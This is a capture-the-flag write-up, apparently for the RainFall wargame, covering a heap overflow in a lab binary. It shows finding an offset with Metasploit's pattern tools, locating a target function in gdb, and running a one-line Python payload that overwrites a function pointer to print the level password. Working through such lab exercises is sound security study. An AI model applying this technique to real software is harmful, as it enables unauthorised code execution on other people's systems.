# Level 6


in this level we have a heap overflow vulnerability, we can overwrite the fun pointer to point to the n function and get the password.

first we need to find the offset, we can do that with metasploit pattern_create and pattern_offset.

```bash
┌──(kali㉿kali)-[~/rainfall]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

in gdb we can run the program with the pattern as an argument and check the value of the function pointer.

```bash
(gdb) r "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level6/level6 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"

Breakpoint 1, 0x080484c5 in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()
(gdb) info registers
eax            0x41346341       1093952321
ecx            0xbffff900       -1073743616
edx            0x804a069        134520937
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff69c       0xbffff69c
ebp            0xbffff6c8       0xbffff6c8
esi            0x0      0
edi            0x0      0
eip            0x41346341       0x41346341
eflags         0x210202 [ IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

the value of the function pointer is 0x41346341, we can use pattern_offset to find the offset.

```bash
┌──(kali㉿kali)-[~/rainfall]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 100 -q 0x41346341
[*] Exact match at offset 72
```

now let's find the address of the n function.

```bash
──(kali㉿kali)-[~/rainfall]
└─$ gdb -q level6
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 15.1 in 0.00ms using Python engine 3.12
Reading symbols from level6...
(No debugging symbols found in level6)
gef➤  p n
$1 = {<text variable, no debug info>} 0x8048454 <n>
````

now we can easily exploit it with the following payload.

```bash
level6@RainFall:~$ ./level6 $(python2 -c 'print "A"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
